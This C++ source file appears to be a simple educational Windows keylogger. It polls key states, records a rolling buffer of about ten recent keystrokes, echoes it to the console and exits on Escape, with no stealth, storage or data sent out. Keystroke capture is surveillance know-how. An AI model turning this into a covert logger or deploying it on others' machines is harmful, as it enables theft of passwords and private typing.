#include <iostream>
#include <vector>
#include <string>
#include <windows.h>
#include <unordered_map>

// Variable set up
std::string key_history = " ";
std::unordered_map<int, int> was_key_down;


int main(){
    // Initizializing unordered map
    int index_count = 0;
    for (int key = 0x20; key <= 0x5A; key++){
        was_key_down[key] = false;
    }
    
    // Key-logging loop
    while (true){
        if (GetAsyncKeyState(VK_ESCAPE) & 0x8000){
            std::cout << "Ending Program" << std::endl;
            std::cout << key_history << std::endl;
            return 0;
        } else {
            // Running through all the keys
            for (int key = 0x20; key <= 0x5A; key++){
                // Checking if this key should be logged
                if (GetAsyncKeyState(key) & 0x8000){ // Is it pressed? [Yes to continue]
                    if (was_key_down[key] == false){ // Has the user been keeping it pressed? [No to continue]
                        // Update the map
                        was_key_down[key] = true;
                        
                        // Log the key
                        char helper_c = static_cast<char>(key);
                        std::string c = std::string(1, helper_c);
                        int str_length = key_history.length();

                        if (str_length == 10){
                            key_history = key_history.substr(1, str_length - 1);
                            key_history = key_history + c;
                        } else {
                            key_history = key_history + c;
                        }
                        std::cout << key_history << std::endl;
                    }
                } else {
                    was_key_down[key] = false;
                }
            }
        }
    }

    return 0;

}